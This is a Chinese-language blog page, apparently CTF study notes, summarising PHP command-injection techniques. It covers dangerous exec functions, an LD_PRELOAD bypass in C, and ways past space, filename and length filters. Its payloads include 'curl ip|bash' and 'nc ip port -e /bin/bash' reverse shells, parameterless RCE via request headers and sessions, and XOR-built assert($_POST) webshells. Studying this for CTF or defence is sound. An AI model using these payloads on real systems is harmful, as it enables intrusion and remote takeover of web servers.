@@ -1,0 +1,1420 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lolydawn">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="命令执行危险函数认识 php -r php代码 如果靶机中有php环境 那么就能使用这个代码来执行php代码 代码里可以继续套娃一些命令执行函数 而且对于php来说 ();等符号不会受到\的转义效果影响  system()  执行外部程序  并且显示输出   exec(string $command,array $output【可选】)  执行外部程序 将输出储存到数组$output里   pas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php命令执行总结">
+<meta property="og:url" content="https://lolydawn.github.io/2024/01/22/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="lolydawn">
+<meta property="og:description" content="命令执行危险函数认识 php -r php代码 如果靶机中有php环境 那么就能使用这个代码来执行php代码 代码里可以继续套娃一些命令执行函数 而且对于php来说 ();等符号不会受到\的转义效果影响  system()  执行外部程序  并且显示输出   exec(string $command,array $output【可选】)  执行外部程序 将输出储存到数组$output里   pas">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-01-22T11:10:22.000Z">
+<meta property="article:modified_time" content="2025-08-22T06:15:05.988Z">
+<meta property="article:author" content="lolydawn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>php命令执行总结 - lolydawn</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lolydawn.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lolydawn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php命令执行总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-22 19:10" pubdate>
+          January 22, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">php命令执行总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="命令执行危险函数认识"><a href="#命令执行危险函数认识" class="headerlink" title="命令执行危险函数认识"></a>命令执行危险函数认识</h2><ul>
+<li><p>php -r php代码 如果靶机中有php环境 那么就能使用这个代码来执行php代码 代码里可以继续套娃一些命令执行函数 而且对于php来说 ();等符号不会受到\的转义效果影响</p>
+</li>
+<li><p>system()</p>
+<ul>
+<li>执行外部程序  并且显示输出</li>
+</ul>
+</li>
+<li><p>exec(string $command,array $output【<strong>可选</strong>】)</p>
+<ul>
+<li>执行外部程序 将输出储存到数组$output里</li>
+</ul>
+</li>
+<li><p>passthru()</p>
+<ul>
+<li>执行外部程序 并且显示原始输出</li>
+</ul>
+</li>
+<li><p>shell_exec()</p>
+<ul>
+<li>通过shell环境执行命令，并且将完整的输出以字符串的形式返回，但这个返回不是返回到页面上 而是比如说$output &#x3D; shell_exec(ls)</li>
+<li>要通过 echo $output 才能输出到页面上</li>
+</ul>
+</li>
+<li><p>popen($cmd,’r’)</p>
+<ul>
+<li><code>$ben = popen($cmd,&#39;r&#39;);</code><br><code>while($s=fgets($ben))&#123;</code><br>      <code>print_r($s);</code><br><code>&#125;</code></li>
+<li>popen函数打开了一个进程文件指针 执行了$cmd</li>
+<li>然后通过fgets函数逐行读取他的输出</li>
+<li>然后将输出通过print_r输出到页面</li>
+</ul>
+</li>
+<li><p>proc_open()</p>
+<ul>
+<li><p>$cmd &#x3D; $_GET[“cmd”]; &#x2F;&#x2F; 通过 GET 请求获取命令<br>$array &#x3D; array(<br>array(“pipe”, “r”),    &#x2F;&#x2F; 标准输入<br>array(“pipe”, “w”),    &#x2F;&#x2F; 标准输出内容<br>array(“file”, “&#x2F;tmp&#x2F;error-output.txt”, “a”) &#x2F;&#x2F; 标准输出错误<br>);</p>
+<p>$fp &#x3D; proc_open($cmd, $array, $pipes);   &#x2F;&#x2F; 打开一个进程通道<br>echo stream_get_contents($pipes[1]);    &#x2F;&#x2F; 输出命令的标准输出内容<br>proc_close($fp);    &#x2F;&#x2F; 关闭进程通道</p>
+</li>
+<li><p>上面的数组是标准的写法 分别是输入 输出 报错内容</p>
+</li>
+<li><p>下面 是打开一个进程通道 执行传递的命令 并且返回一个资源指针$fp和一个文件指针数组$pipes</p>
+</li>
+<li><p>最后通过stream_get_contents读取输出</p>
+</li>
+<li><p>然后用echo输出 最后关闭进程通道</p>
+</li>
+</ul>
+</li>
+<li><p>反引号</p>
+<ul>
+<li>反引号能直接执行命令</li>
+<li>比如 <code>$cmd</code></li>
+<li>不过需要echo才能输出到页面</li>
+</ul>
+</li>
+<li><p>pcntl_exec</p>
+<ul>
+<li>这个函数是php中的一个扩展函数</li>
+<li>$binary&#x3D;””&#x2F;&#x2F;可执行文件的路径</li>
+<li>$args&#x3D;[“””””]&#x2F;&#x2F;参照数组</li>
+<li>pcntl_exec($binary,$args);</li>
+<li>echo”xx”;</li>
+<li>这个函数的功能是 用于替换当前进程的映象 并且执行新的程序</li>
+<li>所以如果他执行成功 就不会有echo 失败的话 echo就会继续执行</li>
+<li>新的进程就是调用的那个文件和参数数组</li>
+</ul>
+</li>
+</ul>
+<h2 id="LD-PRELOAD绕过原理介绍"><a href="#LD-PRELOAD绕过原理介绍" class="headerlink" title="LD_PRELOAD绕过原理介绍"></a>LD_PRELOAD绕过原理介绍</h2><ul>
+<li>mail 函数 <ul>
+<li>内嵌在php里</li>
+<li>先vim demo.php<ul>
+<li>里面写入mail(“,”,”,”)</li>
+<li>然后用strace -o 1.txt -f php demo.php</li>
+<li>这一句是用文档的形式记录我php demo.php 执行的内容</li>
+<li>然后用cat 1.txt | grep execve </li>
+<li>这一句是 检查有哪些是执行文件被调用里</li>
+<li>发现里面有sendmail这个文件</li>
+<li>使用readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail</li>
+<li>然后发现一个 geteuid 函数</li>
+<li>这个时候我们编辑一个库文件 demo.c</li>
+<li>void payload(){</li>
+<li>system(“echo ‘xx’  “)</li>
+<li>}</li>
+<li>int geteuid(){<ul>
+<li>unsetenv(“LD_PRELOAD”);</li>
+<li>payload();</li>
+</ul>
+</li>
+<li>} 然后把这个文件编译成.so文件 生成动态链接库文件</li>
+<li>gcc -shared -fPIC demo.c -o demo.so</li>
+<li>然后把一开始那个demo.php在开头加上一行</li>
+<li>putenv(“LD_PRELOAD&#x3D;.&#x2F;demo.so”)；</li>
+<li>表示执行前先加载这个库文件</li>
+</ul>
+</li>
+<li>绕过条件<ul>
+<li>能够上传自己的.so文件</li>
+<li>能够设置LD_PRELOAD变量的值，比如putenv函数并且未被禁止</li>
+<li>存在可以控制php启动外部程序的函数并且能够执行</li>
+<li>因为新的进程会加载LD_PRELOAD中的.so文件</li>
+<li>比如mail（）等</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>imagick<ul>
+<li>需要扩展安装</li>
+</ul>
+</li>
+</ul>
+<h2 id="操作系统连接符"><a href="#操作系统连接符" class="headerlink" title="操作系统连接符"></a>操作系统连接符</h2><ul>
+<li>；<ul>
+<li>用分号链接 前后都能执行 而且前面命令正确与否都不影响后面命令的执行</li>
+</ul>
+</li>
+<li>&amp;<ul>
+<li>提交后必须要url编码</li>
+<li>而且前面命令不影响后面的执行</li>
+</ul>
+</li>
+<li>两个$<ul>
+<li>如果前面的命令执行成功，才能执行后面的</li>
+<li>如果前面不成功，则两条都无法执行</li>
+</ul>
+</li>
+<li>|<ul>
+<li>把前面命令的结果 作为 | 后面命令的参数</li>
+<li>然后执行后面的命令</li>
+</ul>
+</li>
+<li>||<ul>
+<li>类似于if else语句</li>
+<li>如果前面的命令执行成功，则后面的命令不再执行</li>
+<li>反之执行后面的命令</li>
+</ul>
+</li>
+</ul>
+<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><ul>
+<li>大括号{}<ul>
+<li>{cat,flag.txt} 第一个作为命令，第二个作为参数</li>
+</ul>
+</li>
+<li>使用$IFS ${IFS} $IFS$9</li>
+<li>重定向字符&lt;,&lt;&gt;;<ul>
+<li>&lt;表示的是输入重定向的意思，就是把&lt;后面的文件取代键盘成为新的输入设备</li>
+</ul>
+</li>
+<li>%09 TAB %20 SPACE</li>
+</ul>
+<h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><ul>
+<li>?代表单个字符，前提是这个字符要存在<ul>
+<li>比如flag.php 可以写成????.???</li>
+</ul>
+</li>
+<li>*代表任意字符<ul>
+<li>比如f*.php *</li>
+</ul>
+</li>
+<li>单双引号<ul>
+<li>比如fla””g.p””hp 或者fla’’g.p’’hp</li>
+</ul>
+</li>
+<li>\ 反斜线<ul>
+<li>比如 fla\g.ph\p</li>
+<li>\在Linux里是命令连接符</li>
+</ul>
+</li>
+<li>特殊变量<ul>
+<li>比如$1到$9、$@和$*等</li>
+<li>因为他们的输出都为空</li>
+</ul>
+</li>
+<li>内联执行<ul>
+<li>定义变量 比如$a&#x3D;f;</li>
+<li>然后cat $alag.php</li>
+</ul>
+</li>
+<li>环境变量<ul>
+<li>${PATH:5:1}</li>
+<li>意思是使用环境变量PATH里的第五个字符里的第一位</li>
+<li>从0开始数</li>
+</ul>
+</li>
+</ul>
+<h2 id="文件读取命令的绕过"><a href="#文件读取命令的绕过" class="headerlink" title="文件读取命令的绕过"></a>文件读取命令的绕过</h2><ul>
+<li><p>hexdump -C fimename 能用十六进制的形式读取内容</p>
+</li>
+<li><p>tac 反向显示</p>
+</li>
+<li><p>more 一页一页显示 在linux里按空格翻页</p>
+</li>
+<li><p>less 与more 相似</p>
+</li>
+<li><p>tail 查看末尾几行 最多十行</p>
+</li>
+<li><p>nl 显示的时候 顺便输出行号</p>
+</li>
+<li><p>od 二进制的方式读取</p>
+</li>
+<li><p>xxd 读取二进制文件</p>
+</li>
+<li><p>sort 主要用来排序文件</p>
+</li>
+<li><p>uniq 报告或删除文件中重复的行</p>
+</li>
+<li><p>file -f 报错出具体内容</p>
+</li>
+<li><p>grep </p>
+<ul>
+<li>grep 搜索的字符 匹配的文件</li>
+<li>grep { fla*.php</li>
+</ul>
+</li>
+</ul>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
+<li>base64编码</li>
+<li>echo base64编码后的字符串 | base64 -d | &#x2F;bin&#x2F;bash  最后一项有很多能用的 比如直接bash 或者sh<ul>
+<li>?cmd&#x3D;passthru(‘echo “Y2F0IGZsYWcucGhw”|base64 -d |bash’);</li>
+</ul>
+</li>
+<li>base32编码<br>-HEX编码 即ASCII编码<br> -echo 编码后字符串 | xxd -r -p | &#x2F;bin&#x2F;bash<ul>
+<li>?cmd&#x3D;passthru(‘echo “74616320666c61672e706870”|xxd -r -p|bash’);</li>
+</ul>
+</li>
+<li>shellcode编码</li>
+<li>shellcode是ASCII编码用&#x2F;x来表示</li>
+<li>这里用printf替代echo即可</li>
+<li>hex2bin函数解码</li>
+</ul>
+<h2 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h2><ul>
+<li>sleep 3<ul>
+<li>表示三秒之后再执行</li>
+</ul>
+</li>
+<li>awk NR&#x3D;&#x3D;1</li>
+<li>表示返回第一行的结果</li>
+<li>cut -c 1</li>
+<li>表示返回第一个字符的结果</li>
+<li>if语句</li>
+<li>if []；then ；fi</li>
+<li>表示[]里面是判断 ，如果真就执行then后面的语句 假就fi 注意if和[]中间要用空格隔开</li>
+<li>if [$(cat flag | awk NR&#x3D;&#x3D;1 | cut -c 1)&#x3D;&#x3D;a];then echo “right”;fi</li>
+<li>可以用python写一个脚本跑值 类似于sql盲注的思路</li>
+</ul>
+<h2 id="长度过滤绕过前置知识"><a href="#长度过滤绕过前置知识" class="headerlink" title="长度过滤绕过前置知识"></a>长度过滤绕过前置知识</h2><ul>
+<li><blockquote>
+</blockquote>
+</li>
+<li><p>例如 echo dada &gt; a</p>
+</li>
+<li><p>就会把dada写到a里面 如果还是一个大于号写入值 就会覆盖原有的内容 可以用两个大于号去新增内容</p>
+</li>
+<li><p>使用&gt;&gt;追加内容</p>
+</li>
+<li><p>使用&#x2F;进行命令换行 上面提到过 就是命令链接的作用</p>
+</li>
+<li><p>ls-t</p>
+</li>
+<li><p>表示先近后远的按照时间来排序</p>
+</li>
+<li><p>但要注意不能复制粘贴 一下生成几个文件 这样用时间排序是会出错的</p>
+</li>
+<li><p>可以利用&gt;写很多个文件 只有名字那种 然后用ls -t 会发现 结果是一个有用的排序 比如 cat \ flag这种形式 中间可以多用几个\链接 然后把这个ls -t的结果&gt;某个文件里 然后. 这个文件 就可以执行了</p>
+</li>
+<li><p>然后就能读出flag的值里</p>
+</li>
+<li><p>sh执行 或者. 执行是一样的</p>
+</li>
+<li><p>dir * </p>
+</li>
+<li><p>把第一个文件的文件名作为命令 第二个或者后面的作为参数 来执行</p>
+</li>
+<li><p>比如说 cat 然后 flag.php</p>
+</li>
+<li><p>rev 可以反过来显示文件的内容</p>
+</li>
+<li><p>123 显示成 321</p>
+</li>
+</ul>
+<h2 id="长度为7的绕过方法"><a href="#长度为7的绕过方法" class="headerlink" title="长度为7的绕过方法"></a>长度为7的绕过方法</h2><ul>
+<li><p>先构造期望执行的指令</p>
+</li>
+<li><p>cat flag|nc ip 端口号</p>
+</li>
+<li><p>思路</p>
+</li>
+<li><p>利用 &gt; 创造很短的文件名</p>
+</li>
+<li><p>ls -t 按照时间排序列出文件名，按行存储</p>
+</li>
+<li><p>\连接换行命令</p>
+</li>
+<li><p>sh从文件中读取命令</p>
+</li>
+<li><p>具体内容</p>
+</li>
+<li><blockquote>
+<p>ca\</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>t\ \</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>flag\</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>|n\</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>c\ \</p>
+</blockquote>
+</li>
+<li><p>ip</p>
+</li>
+<li><p>端口</p>
+</li>
+<li><p>注意文件名不能重复</p>
+</li>
+<li><p>ls -t&gt;a</p>
+</li>
+<li><p>sh a即可反弹shell</p>
+</li>
+<li><p>也可以写Python脚本执行</p>
+</li>
+</ul>
+<h2 id="长度为5的绕过"><a href="#长度为5的绕过" class="headerlink" title="长度为5的绕过"></a>长度为5的绕过</h2><ul>
+<li><p>期望执行指令</p>
+</li>
+<li><p>curl ip|bash</p>
+</li>
+<li><p>利用这个 在这个ip的index.html下写好nc ip 端口 -e &#x2F;bin&#x2F;bash</p>
+</li>
+<li><p>第一步 构造ls -t&gt;y</p>
+</li>
+<li><blockquote>
+<p>ls\</p>
+</blockquote>
+</li>
+<li><p>再创建文件 ls&gt;_</p>
+</li>
+<li><blockquote>
+<p>\ \ </p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>-t\</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>&gt;y</p>
+</blockquote>
+</li>
+<li><p>然后ls&gt;&gt;_</p>
+</li>
+<li><p>sh _即可实现ls -t</p>
+</li>
+<li><p>然后再把期待执行的指令给写进去 先不用sh _</p>
+</li>
+<li><p>全写完再执行 sh _ sh y</p>
+</li>
+</ul>
+<h2 id="长度为4的绕过"><a href="#长度为4的绕过" class="headerlink" title="长度为4的绕过"></a>长度为4的绕过</h2><ul>
+<li><p>这里新的问题是 追加到_用不了了</p>
+</li>
+<li><p>仍要先构造ls -t&gt;g</p>
+</li>
+<li><p>这里用到dir 和rev 一个是一行内展示文件 另一个是倒序</p>
+</li>
+<li><p>先构造ls -t&gt;g</p>
+</li>
+<li><blockquote>
+<p>g&gt;</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>t-</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>sl</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>dir</p>
+</blockquote>
+</li>
+<li><p>在-t后面加h，不影响命令执行 但可以改变顺序</p>
+</li>
+<li><p>如果敲一个*号</p>
+</li>
+<li><p>就会执行第一个文件名的命令 把后面的当做参数</p>
+</li>
+<li><p>因为第一个是dir 所以就是dir 列出后面的文件名</p>
+</li>
+<li><p>*&gt;v 这样v就是那些排序</p>
+</li>
+<li><p>这时候rev v 就能把v倒序排列</p>
+</li>
+<li><p>rev 可以用 * 代替</p>
+</li>
+<li><p>所以 牛逼的就是 *v&gt;x</p>
+</li>
+<li><p>注意点 为了防止g后面有其他文件名影响 可以多创建一个文件 g;</p>
+</li>
+<li><p>然后构造反弹shell 和上面一样是curl ip|bash 不过ip要用16进制来写</p>
+</li>
+<li><p>利用文件包含漏洞</p>
+</li>
+<li><p>先是c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;&#x2F;etc&#x2F;passwd</p>
+</li>
+<li><p>表示包含一个参数1 然后对1进行定义 这里因为分号被过滤 不过最后一个分号不用写  然后1的包含 如果是flag无法输出 所以用php一个伪协议 然后base64 decode 就行</p>
+</li>
+<li><p>include 可以用 require 代替</p>
+</li>
+<li><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("mv fla?.php 1.txt");?></p>
+<ul>
+<li>data为协议</li>
+</ul>
+</li>
+</ul>
+<h2 id="无参数命令执行请求头绕过"><a href="#无参数命令执行请求头绕过" class="headerlink" title="无参数命令执行请求头绕过"></a>无参数命令执行请求头绕过</h2><ul>
+<li><p>php7.3</p>
+</li>
+<li><p>条件是一个正则表达式 过滤掉所有的 a() 形式 以及R表示递归 所以a(b())等等都会被过滤 但例题中要求过滤完只剩下一个分号 所以我们的payload就只能是这种形式 所以叫做无参数</p>
+</li>
+<li><p>getallheaders()这个函数是获得所有的http请求头的内容 不过需要print_r 才能打印到页面</p>
+</li>
+<li><p>可以使用bp 更方便改包发包</p>
+</li>
+<li><p>注意点 我们bp里拦截下来的请求头的值 和 print_r打印到页面里的顺序是相反的</p>
+</li>
+<li><p>所以我们可以修改某个项的内容 来进行命令执行</p>
+</li>
+<li><p>pos()函数 把第一项的内容显示出来</p>
+</li>
+<li><p>end() 和pos相反</p>
+</li>
+<li><p>比如我们可以把最后一项 的值 改成 system(‘ls’)；</p>
+</li>
+<li><p>然后eval(pos(getallheaders()))</p>
+</li>
+<li><p>还有一个 apache_request_header 作用和getallheaders相似 不过只能在Apache使用</p>
+</li>
+</ul>
+<h2 id="无参数命令执行之全局变量RCE"><a href="#无参数命令执行之全局变量RCE" class="headerlink" title="无参数命令执行之全局变量RCE"></a>无参数命令执行之全局变量RCE</h2><ul>
+<li>PHP5&#x2F;7</li>
+<li>get_defined_vars() 返回所有已定义变量的值所组成的数组</li>
+<li>返回数组的顺序是 GET-&gt;POST-&gt;COOKIE-&gt;FILES</li>
+<li>pos end 仍然可以用</li>
+<li>还能用&amp;加上别的指令 比如&amp;cmd&#x3D;system(‘ls’);</li>
+<li>而且实际上这样写进去是分成两行的 所以能用end 取出第二个 就是cmd的值</li>
+<li>eval同样能用 还有assert</li>
+<li>python脚本</li>
+</ul>
+<h2 id="无参数命令执行之sessionRCE"><a href="#无参数命令执行之sessionRCE" class="headerlink" title="无参数命令执行之sessionRCE"></a>无参数命令执行之sessionRCE</h2><ul>
+<li>php5</li>
+<li>session_start() 启动新会话或者重用现有回话 返回值只有1或者0</li>
+<li>session_id(session_start)  这样请求头的cookie里面就要sessionid这一项里 而且值很长 对方也能接收到</li>
+<li>所以例题里面 get传参就写 session_id(session_start()) 然后bp拦截 修改cookie里sessionid的值就行</li>
+<li>print_r修改为show_source()</li>
+<li>sessionid改为.&#x2F;flag 配合上一行 就能读取值了</li>
+<li>如果是eval的话 里面phpsessionid的值就要用hex编码变成16进制 </li>
+<li>外面再用hex2bin()函数转换成2进制 然后eval执行</li>
+</ul>
+<h2 id="无参数命令执行之scandir读取"><a href="#无参数命令执行之scandir读取" class="headerlink" title="无参数命令执行之scandir读取"></a>无参数命令执行之scandir读取</h2><ul>
+<li>scandir() <ul>
+<li>列出指定路径中的文件和目录</li>
+<li>类似ls</li>
+</ul>
+</li>
+<li>getcwd()<ul>
+<li>取得当前工作目录 </li>
+<li>类似pwd</li>
+</ul>
+</li>
+<li>current()<ul>
+<li>返回数组中的当前值</li>
+<li>好像就是第一个值</li>
+</ul>
+</li>
+<li>array_reverse()<ul>
+<li>返回顺序相反的数组</li>
+</ul>
+</li>
+<li>array_filp()<ul>
+<li>把键值对互换</li>
+</ul>
+</li>
+<li>next()<ul>
+<li>将数组中的内部指针向前移动</li>
+</ul>
+</li>
+<li>array_rand()<ul>
+<li>从数组中随机取出一个或者多个键</li>
+</ul>
+</li>
+<li>chdir()<ul>
+<li>和cd类似 用于改变当前工作目录</li>
+</ul>
+</li>
+<li>strrev()<ul>
+<li>用于反转给定的字符串</li>
+</ul>
+</li>
+<li>crypt()<ul>
+<li>用来加密</li>
+</ul>
+</li>
+<li>hebrevc()<ul>
+<li>转换流的方向</li>
+</ul>
+</li>
+<li>localeconv()<ul>
+<li>显示的数组第一项是.</li>
+<li>所以可以利用这个函数 加上current scandir print_r 读取当前目录下的文件名</li>
+<li>show_source current 加上上面的 就能查看文件里</li>
+</ul>
+</li>
+<li>查看上级目录的文件<ul>
+<li>dirname(getcwd()) 显示上一级目录路径</li>
+<li>但是我们需要使用chdir来修改执行目录<ul>
+<li>chidir(dirname(getcwd()))</li>
+<li>这里不太懂 还要再研究一下</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>根目录<ul>
+<li>用serialize(array())序列化一个数组</li>
+<li>然后crypt加密</li>
+<li>strrev倒序 如果倒序后第一个是斜杆 可以chr ord 互转 因为他们只对第一个字符起作用 所以只剩一个字符</li>
+<li>就有可能获取到斜杆</li>
+<li>可以利用bp爆破 获取某个特定文件内容 不过还需要多研究</li>
+</ul>
+</li>
+</ul>
+<h2 id="无字母数字-异或运算绕过"><a href="#无字母数字-异或运算绕过" class="headerlink" title="无字母数字-异或运算绕过"></a>无字母数字-异或运算绕过</h2><ul>
+<li>原理 echo base_convert(bin2hex(‘5’),16,2) &#x3D; 00110101<ul>
+<li>这是输出5的2进制</li>
+</ul>
+</li>
+<li>然后同理把别的字符也转换成2进制<ul>
+<li>之后两个2进制字符串进行逐位异或运算</li>
+<li>然后反过来解码 得到正常字符 比如5和Z能生成o</li>
+</ul>
+</li>
+<li>所以我们可以利用php脚本来构造我们想要的payload 通过既不是字母也不是数字的特殊字符</li>
+<li>异或运算符是 ^ 比如 “5”^”Z”</li>
+<li>在例题中 ?cmd&#x3D;$_&#x3D;””^””;$-();<ul>
+<li>后面那个是下划线 makedown不好写 记得要url编码</li>
+<li>这边的例子是先用poc构造一个phpinfo 然后$_&#x3D;字符串异或字符串 分号<ul>
+<li>也就是$_&#x3D;phpinfo 然后再来一个$-(); 这样就能执行phpinfo()；了</li>
+<li>看懂掌声..</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>下面说5的 7可以用反引号包裹 <code>$_POST[-]</code>;不过不能回显 <ul>
+<li>assert($_POST[‘-‘])</li>
+<li>这个类似一句话木马</li>
+<li>构造方法<ul>
+<li>$a&#x3D;’assert’;</li>
+<li>$b&#x3D;’_POST’;</li>
+<li>$c&#x3D;$$b;</li>
+<li>$a($c[‘_’]);</li>
+</ul>
+</li>
+<li>把 a b c 换成下划线 两个下划线 三个下划线 别的用异或运算替换掉即可<ul>
+<li>$_&#x3D;”!((%)(“^”@[[@[&quot;</li>
+<li>$__&#x3D;”!+&#x2F;((“^”~{&#96;{|”</li>
+<li><code>$___=$$__</code></li>
+<li><code>$_($$__[&#39;_&#39;]);</code></li>
+<li>所以到例中的payload如下</li>
